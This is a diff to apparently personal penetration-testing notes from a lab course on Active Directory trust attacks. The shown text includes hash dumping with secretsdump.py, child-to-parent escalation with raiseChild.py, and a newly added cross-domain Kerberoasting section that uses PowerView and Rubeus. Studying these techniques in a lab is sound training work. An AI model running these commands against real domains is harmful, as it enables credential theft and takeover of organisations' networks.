@@ -64,6 +64,8 @@ bloodhound
 - The sidHistory attribute is used in migration scenarios. If a user in one domain is migrated to another domain, a new account is created in the second domain.
 - The original user's SID will be added to the new user's SID history attribute, ensuring that the user can still access resources in the original domain.
 - SID history is intended to work across domains, but can work in the `same domain`.
+- **Case:** `LOGISTICS.INLANEFREIGHT.LOCAL` and `INLANEFREIGHT.LOCAL` have bidirectional trust and we are in domain `LOGISTICS.INLANEFREIGHT.LOCAL` 
+
 
 
 ## ExtraSids Attack
@@ -161,6 +163,20 @@ secretsdump.py inlanefreight.local/administrator@172.16.5.5 -just-dc -hashes aad
 # from Impacket toolkit
 # the ip of parent DC then the child domain user
 raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm
+```
+
+
+## child to parent Kerberoasting
+
+```
+# Enumerating Accounts for Associated SPNs
+Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL | select SamAccountName
+
+# Enumerating the mssqlsvc Account
+Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc |select samaccountname,memberof
+
+# Performing a Kerberoasting Attacking with Rubeus Using /domain Flag
+.\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap
 ```
 
 
